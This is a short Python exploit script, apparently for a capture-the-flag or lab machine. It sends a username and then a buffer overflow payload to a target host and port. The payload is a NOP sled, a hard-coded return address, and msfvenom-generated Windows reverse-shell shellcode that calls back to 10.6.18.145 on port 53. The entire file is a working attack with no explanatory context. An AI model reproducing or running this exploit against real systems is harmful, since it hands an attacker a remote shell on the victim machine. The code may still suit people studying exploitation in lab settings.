#!/usr/bin/env python

# Skeleton Buffer Overflow script
# usage python brain.py <targetIP> <targetPort>

import sys, socket

rhost = sys.argv[1]
rport = int(sys.argv[2])

uname = "yavuz"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.145 LPORT=53 -f c -b "\x00"
shellcode = (
    "\xb8\x70\xb0\x15\xb7\xd9\xcb\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
    "\x52\x31\x43\x12\x03\x43\x12\x83\xb3\xb4\xf7\x42\xcf\x5d\x75"
    "\xac\x2f\x9e\x1a\x24\xca\xaf\x1a\x52\x9f\x80\xaa\x10\xcd\x2c"
    "\x40\x74\xe5\xa7\x24\x51\x0a\x0f\x82\x87\x25\x90\xbf\xf4\x24"
    "\x12\xc2\x28\x86\x2b\x0d\x3d\xc7\x6c\x70\xcc\x95\x25\xfe\x63"
    "\x09\x41\x4a\xb8\xa2\x19\x5a\xb8\x57\xe9\x5d\xe9\xc6\x61\x04"
    "\x29\xe9\xa6\x3c\x60\xf1\xab\x79\x3a\x8a\x18\xf5\xbd\x5a\x51"
    "\xf6\x12\xa3\x5d\x05\x6a\xe4\x5a\xf6\x19\x1c\x99\x8b\x19\xdb"
    "\xe3\x57\xaf\xff\x44\x13\x17\xdb\x75\xf0\xce\xa8\x7a\xbd\x85"
    "\xf6\x9e\x40\x49\x8d\x9b\xc9\x6c\x41\x2a\x89\x4a\x45\x76\x49"
    "\xf2\xdc\xd2\x3c\x0b\x3e\xbd\xe1\xa9\x35\x50\xf5\xc3\x14\x3d"
    "\x3a\xee\xa6\xbd\x54\x79\xd5\x8f\xfb\xd1\x71\xbc\x74\xfc\x86"
    "\xc3\xae\xb8\x18\x3a\x51\xb9\x31\xf9\x05\xe9\x29\x28\x26\x62"
    "\xa9\xd5\xf3\x25\xf9\x79\xac\x85\xa9\x39\x1c\x6e\xa3\xb5\x43"
    "\x8e\xcc\x1f\xec\x25\x37\xc8\x19\xb2\xdc\x5e\x76\xc0\x22\x5f"
    "\xb3\x4d\xc4\x35\xab\x1b\x5f\xa2\x52\x06\x2b\x53\x9a\x9c\x56"
    "\x53\x10\x13\xa7\x1a\xd1\x5e\xbb\xcb\x11\x15\xe1\x5a\x2d\x83"
    "\x8d\x01\xbc\x48\x4d\x4f\xdd\xc6\x1a\x18\x13\x1f\xce\xb4\x0a"
    "\x89\xec\x44\xca\xf2\xb4\x92\x2f\xfc\x35\x56\x0b\xda\x25\xae"
    "\x94\x66\x11\x7e\xc3\x30\xcf\x38\xbd\xf2\xb9\x92\x12\x5d\x2d"
    "\x62\x59\x5e\x2b\x6b\xb4\x28\xd3\xda\x61\x6d\xec\xd3\xe5\x79"
    "\x95\x09\x96\x86\x4c\x8a\xa6\xcc\xcc\xbb\x2e\x89\x85\xf9\x32"
    "\x2a\x70\x3d\x4b\xa9\x70\xbe\xa8\xb1\xf1\xbb\xf5\x75\xea\xb1"
    "\x66\x10\x0c\x65\x86\x31"
)

payload = "\x90" * 2012 + "\xdf\x14\x50\x62" + "\x90" * 20 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(uname + "\r\n")
s.recv(1024)
s.send(payload + "\r\n")
data = s.recv(1024)
s.close()
